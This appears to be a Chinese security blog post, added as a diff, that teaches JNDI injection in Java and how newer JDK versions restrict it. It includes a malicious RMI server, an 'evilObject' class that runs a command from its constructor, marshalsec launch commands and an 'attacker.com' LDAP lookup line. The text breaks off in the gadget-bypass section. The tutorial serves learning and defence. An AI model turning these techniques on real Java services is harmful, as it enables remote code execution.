@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            JAVA JNDI注入基础与高版本限制绕过
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <div class="post-date">
+            <p> January 2nd 2021, 5:37:20 pm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+        </div>
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E4%B8%8ELDAP"><span class="toc-text">RMI与LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%BF%E7%94%A8%E4%BE%8B%E5%AD%90"><span class="toc-text">JNDI原理及使用例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-text">JNDI注入在不同版本下的限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87RMI%E4%B8%8ELDAP%E8%BF%9B%E8%A1%8CJNDI%E6%B3%A8%E5%85%A5-jdk-lt-8u191"><span class="toc-text">通过RMI与LDAP进行JNDI注入(jdk&lt;8u191)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E4%BE%8B%E5%AD%90"><span class="toc-text">复现例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">调用链分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%85%E5%AE%B9%E8%A7%A6%E5%8F%91%E6%9C%AC%E5%9C%B0Gadget%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84%E9%99%90%E5%88%B6-jdk-gt-8u191"><span class="toc-text">通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制(jdk&gt;&#x3D;8u191)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E4%BE%8B%E5%AD%90-1"><span class="toc-text">复现例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="toc-text">调用链分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory-%E5%BE%85%E5%AD%A6%E4%B9%A0"><span class="toc-text">利用本地Class作为Reference Factory(待学习)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一开始学习Fastjson，发现自己对LDAP这个知识点不是特别了解，进而又是JNDI注入。在学习Fastjson漏洞之前先来学习一下这两个知识。</p>
+<p>这篇文章分为以下内容：</p>
+<ul>
+<li>JNDI注入所需的基础知识</li>
+<li>通过RMI与LDAP进行JNDI注入</li>
+<li>绕过高版本JDK的限制</li>
+</ul>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="RMI与LDAP"><a href="#RMI与LDAP" class="headerlink" title="RMI与LDAP"></a>RMI与LDAP</h3><p><strong>RMI</strong></p>
+<p><a target="_blank" rel="noopener" href="https://threezh1.com/2020/12/19/JAVA_RMI_Learn/">JAVA RMI 反序列化攻击 &amp; JEP290 Bypass分析</a></p>
+<p><strong>LDAP</strong></p>
+<blockquote>
+<p>目录是一种分布式数据库，目录服务是由目录数据库和一套访问协议组成的系统。LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP/IP协议栈之上，基于C/S架构。除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：</p>
+</blockquote>
+<ul>
+<li>Java序列化</li>
+<li>JNDI Reference</li>
+<li>Marshalled对象</li>
+<li>Remote Location (已弃用)</li>
+</ul>
+<p>LDAP可以为存储的Java对象指定多种属性：</p>
+<ul>
+<li>javaCodeBase</li>
+<li>objectClass</li>
+<li>javaFactory</li>
+<li>javaSerializedData<br>…</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wilburxu/p/9174353.html">LDAP概念和原理介绍</a></p>
+<h3 id="JNDI原理及使用例子"><a href="#JNDI原理及使用例子" class="headerlink" title="JNDI原理及使用例子"></a>JNDI原理及使用例子</h3><p>在BlackHat的那篇JNDI注入PPT里对JNDI有一段描述，我觉得更好理解一些：</p>
+<ul>
+<li>Java Naming and Directory Interface 命名与目录接口</li>
+<li>JNDI提供了一个公共接口来与不同类型的服务作交互(命名与目录服务)</li>
+<li>命名服务(Naming Service)<ul>
+<li>命名服务是将名称与值相关联的实体，也称为“绑定(binding)”。</li>
+<li>它提供了一种基于名称查找对象的工具，该名称称为“查找(lookup)”或“search”操作。</li>
+</ul>
+</li>
+<li>目录服务(Directory Service)<ul>
+<li>允许存储和查找“目录对象”的特殊类型的命名服务。</li>
+<li>目录对象不同于一般对象，因为它可以将属性与对象相关联。</li>
+<li>因此，目录服务提供了对对象属性进行操作的扩展功能。</li>
+</ul>
+</li>
+</ul>
+<p>JNDI提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16092307280043.jpg"></p>
+<p>对于JNDI的一个结构图：</p>
+<ul>
+<li>JNDI提供了一个公共接口来与不同类型的服务作交互(命名与目录服务)</li>
+<li>命名管理器(The Naming Manager)包含用于创建上下文对象和对象的静态方法。由位置信息引用</li>
+<li>服务器提供程序接口（SPI）允许JNDI管理不同的服务。</li>
+</ul>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16095740866114.jpg"></p>
+<p>在JDNI注入中，我们可以把JNDI理解是一个大接口，LDAP和RMI等服务等服务把资源对象或者方法绑定在固定的远程服务端，JNDI进行统一管理供应用程序进行访问和调用。等会直接看例子会更好理解一些。</p>
+<p>一个简单的JNDI例子：</p>
+<p>IHello.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>IHelloImpl.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IHelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">IHelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>CallService.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        IHello hello = <span class="keyword">new</span> IHelloImpl();</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br><span class="line"></span><br><span class="line">        IHello rHello = (IHello) ctx.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(rHello.sayHello(<span class="string">&quot;RickGray&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>JNDI获取并调用了远程方法<code>say.Hello</code>。</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093258958546.jpg" alt="-w1792"></p>
+<p>在<code>CallService</code>这里对JNDI服务进行了初始化，在初始化配置 JNDI 设置时可以预先指定其上下文环境（RMI、LDAP 或者 CORBA 等)。这里的例子是指定了上下文环境为RMI。<br>这个指定是动态的，在调用 lookup() 或者 search() 时，可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.lookup(&quot;ldap:&#x2F;&#x2F;attacker.com:12345&#x2F;ou&#x3D;foo,dc&#x3D;foobar,dc&#x3D;com&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>通过这个例子可以看出，用户只需要使用JNDI，可以跟RMI、LDAP等各种服务进行交互，这样是为了在JAVA中能够更方便的管理、访问和调用远程的资源对象。</p>
+<p>JNDI注入就出现在<code>lookup</code>方法中，如果<code>InitialContext.lookup(URI)</code>中的URL可控，那么就存在JDNI注入漏洞风险。</p>
+<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="JNDI注入在不同版本下的限制"><a href="#JNDI注入在不同版本下的限制" class="headerlink" title="JNDI注入在不同版本下的限制"></a>JNDI注入在不同版本下的限制</h3><p>随着JDK的升级，不同的利用方式在不同版本下的利用区别可以参考下图：</p>
+<ul>
+<li>JDK 5U45、6U45、7u21、8u121 开始 java.rmi.server.useCodebaseOnly 默认配置为true</li>
+<li>JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false</li>
+<li>JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为false</li>
+</ul>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16095753735332.jpg"></p>
+<p>RMI和LDAP的JDNI注入过程是差不多的，只是在<code>Reference</code>的获取上有差异，所以这里以RMI-JDNI为例进行分析。</p>
+<h3 id="通过RMI与LDAP进行JNDI注入-jdk-lt-8u191"><a href="#通过RMI与LDAP进行JNDI注入-jdk-lt-8u191" class="headerlink" title="通过RMI与LDAP进行JNDI注入(jdk&lt;8u191)"></a>通过RMI与LDAP进行JNDI注入(jdk&lt;8u191)</h3><p>在<code>lookup</code>方法调用过程中对<code>Reference</code>类的特殊处理，通过RMI和LDAP所进行的JNDI注入都是基于这个特殊处理来利用的。</p>
+<p>通过RMI进行JDNI注入的步骤如下：</p>
+<ol>
+<li>攻击者需要构造一个恶意对象，在其构造方法处加入恶意代码。将其上传到服务器中等待远程加载</li>
+<li>构造一个恶意RMI服务器，<code>bind</code>一个<code>ReferenceWrapper</code>对象，<code>ReferenceWrapper</code>对象是<code>Reference</code>对象的封装</li>
+<li><code>Reference</code>对象中包含了一个远程地址，远程地址中可以加载恶意对象class</li>
+<li>JNDI在<code>lookup</code>过程中会解析<code>Reference</code>对象并远程加载恶意对象触发漏洞</li>
+</ol>
+<p><code>javax.naming.Reference</code>构造方法为：<code>Reference(String className, String factory, String factoryLocation)</code></p>
+<ul>
+<li>className - 远程加载时所使用的类名</li>
+<li>classFactory - 加载的class中需要实例化类的名称</li>
+<li>classFactoryLocation - 提供classes数据的地址可以是file/ftp/http等协议</li>
+</ul>
+<h4 id="复现例子"><a href="#复现例子" class="headerlink" title="复现例子"></a>复现例子</h4><p><strong>自己搭建一个RMI服务</strong></p>
+<p>RMIServer.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;testObject&quot;</span>, <span class="string">&quot;testObject&quot;</span>, <span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;testObject&quot;</span>, wrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;run in 1099&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在RMI中，一个对象要成为远程对象的话，必须要继承<code>UnicastRemoteObject</code>类，因为<code>Reference</code>没有实现<code>Remote</code>接口也没有继承<code>UnicastRemoteObject</code>类，故不能作为远程对象bind到注册中心，所以需要使用ReferenceWrapper对Reference的实例进行一个封装。</p>
+<p>JNDIClient.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> InitialContext().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/testObject&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当客户端调用<code>InitialContext().lookup()</code>方法时，会从<code>http://127.0.0.1/testObject.class</code>处获取class并触发构造方法中的恶意代码。</p>
+<p>evilObject.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是这个类应放在一个无关的目录且不需要加包名，再用<code>javac evulObject.java</code>来生成class文件。将class文件放到一个web服务下即可。(例子放在了本地web根目录下)</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093363362076.jpg" alt="-w1790"></p>
+<p><strong>使用marshalsec起一个RMI服务</strong></p>
+<p>除了自己搭建一个RMI服务之外，也可以直接使用marshalsec起一个RMI服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;127.0.0.1:80&#x2F;#testObject 7777</span><br></pre></td></tr></table></figure>
+
+<p>利用跟上面是一样的。</p>
+<p><strong>使用marshalsec起一个LDAP服务</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:80&#x2F;#testObject 7777</span><br></pre></td></tr></table></figure>
+
+<p>LDAP服务就只是把协议名改成ldap即可：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093986951767.jpg" alt="-w1791"></p>
+<h4 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h4><p>漏洞触发点堆栈：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference(Reference, String):163, NamingManager (javax.naming.spi), NamingManager.java</span><br><span class="line">getObjectInstance(Object, Name, Context, Hashtable):319, NamingManager (javax.naming.spi), NamingManager.java</span><br><span class="line">decodeObject(Remote, Name):456, RegistryContext (com.sun.jndi.rmi.registry), RegistryContext.java</span><br><span class="line">lookup(Name):120, RegistryContext (com.sun.jndi.rmi.registry), RegistryContext.java</span><br><span class="line">lookup(String):203, GenericURLContext (com.sun.jndi.toolkit.url), GenericURLContext.java</span><br><span class="line">lookup(String):411, InitialContext (javax.naming), InitialContext.java</span><br><span class="line">main(String[]):7, JNDIClient (jndi_test1), JNDIClient.java</span><br></pre></td></tr></table></figure>
+
+<p>跟入使用例子的<code>JNDIClient.java</code>的<code>lookup</code>方法：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093340610568.jpg" alt="-w1000"></p>
+<p>继续跟入<code>lookup</code>方法：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093341980228.jpg" alt="-w1000"></p>
+<p>继续跟入这个<code>lookup</code>方法：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093351522393.jpg" alt="-w1000"></p>
+<p>这里通过调用<code>this.registry.lookup</code>获取到了<code>ReferenceWrapper_Stub</code>对象，并与<code>testObject</code>一起传入了<code>this.decodeObject</code>方法：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093353067088.jpg" alt="-w1000"></p>
+<p>通过<code>getReference()</code>获取到了<code>Reference</code>对象，继续跟入<code>NamingManager.getObjectInstance</code>：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093354611953.jpg" alt="-w1000"></p>
+<p>这里的Ref包含Reference对象的一些信息：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093355675102.jpg" alt="-w1000"></p>
+<p>继续跟入<code>getObjectFactoryFromReference</code>：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093357649087.jpg" alt="-w1000"></p>
+<p>如果本地存在需要获取的类，则会使用<code>clas = helper.loadClass(factoryName);</code>在本地直接获取。如果本地不存在，则使用<code>clas = helper.loadClass(factoryName, codebase);</code>远程加载类：</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093359564339.jpg" alt="-w1000"></p>
+<p>这里使用<code>URLClassLoader</code>来远程动态加载类。</p>
+<p>接着获取到类之后，会在<code>return</code>处调用<code>clas.newInstance()</code>，会触发类的构造方法。我们把恶意语句写在了构造方法处，所以在这里会被触发执行。</p>
+<p><strong>关于codebase</strong></p>
+<blockquote>
+<p>Codebase指定了Java程序在网络上远程加载类的路径。RMI机制中交互的数据是序列化形式传输的，但是传输的只是对象的数据内容，RMI本身并不会传递类的代码。当本地没有该对象的类定义时，RMI提供了一些方法可以远程加载类，也就是RMI动态加载类的特性。<br>Codebase实际上是一个URL表，该URL上存放了接收方需要的类文件。<br>当接收程序试图从该URL的Webserver上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 com.project.test ，那么接受方就会到下面的URL去下载类文件：<br><a target="_blank" rel="noopener" href="http://url:8080/com/project/test.class">http://url:8080/com/project/test.class</a></p>
+</blockquote>
+<p><strong>修复后的限制</strong></p>
+<p>在<code>JDK 6u132、7u122、8u113</code>之中对这个利用方式进行了限制，在<code>decodeObject</code>方法处新增了一个读<code>trustURLCodebase</code>的判断，而这个值默认是为<code>false</code>的。</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093912606124.jpg" alt="-w1000"></p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093912859163.jpg" alt="-w1000"></p>
+<p>调用会抛出异常 <code>The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.</code>。</p>
+<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2021/01/02/16093919073008.jpg" alt="-w1000"></p>
+<p><strong>ldap的调用链</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference(Reference, String):146, NamingManager (javax.naming.spi), NamingManager.java</span><br><span class="line">getObjectInstance(Object, Name, Context, Hashtable, Attributes):188, DirectoryManager (javax.naming.spi), DirectoryManager.java</span><br><span class="line">c_lookup(Name, Continuation):1086, LdapCtx (com.sun.jndi.ldap), LdapCtx.java</span><br><span class="line">p_lookup(Name, Continuation):544, ComponentContext (com.sun.jndi.toolkit.ctx), ComponentContext.java</span><br><span class="line">lookup(Name):177, PartialCompositeContext (com.sun.jndi.toolkit.ctx), PartialCompositeContext.java</span><br><span class="line">lookup(String):203, GenericURLContext (com.sun.jndi.toolkit.url), GenericURLContext.java</span><br><span class="line">lookup(String):94, ldapURLContext (com.sun.jndi.url.ldap), ldapURLContext.java</span><br><span class="line">lookup(String):411, InitialContext (javax.naming), InitialContext.java</span><br><span class="line">main(String[]):7, JNDIClient (jndi_test1), JNDIClient.java</span><br></pre></td></tr></table></figure>
+
+<p>LDAP的限制是从JDK 11.0.1、8u191、7u201、6u211 开始的，之后的版本<code>com.sun.jndi.ldap.object.trustURLCodebase</code>默认为false。</p>
+<p>所以<code>jdk 8u191</code>之后的的版本，无法通过RMI、LDAP加载远程的Reference工厂类。</p>
+<h3 id="通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制-jdk-gt-8u191"><a href="#通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制-jdk-gt-8u191" class="headerlink" title="通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制(jdk&gt;=8u191)"></a>通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制(jdk&gt;=8u191)</h3><p>通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制，需要本地存在Gadget可以利用才行，这里用cc5的链来进行分析。</p>
+<h4 id="复现例子-1"><a href="#复现例子-1" class="headerlink" title="复现例子"></a>复现例子</h4><p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 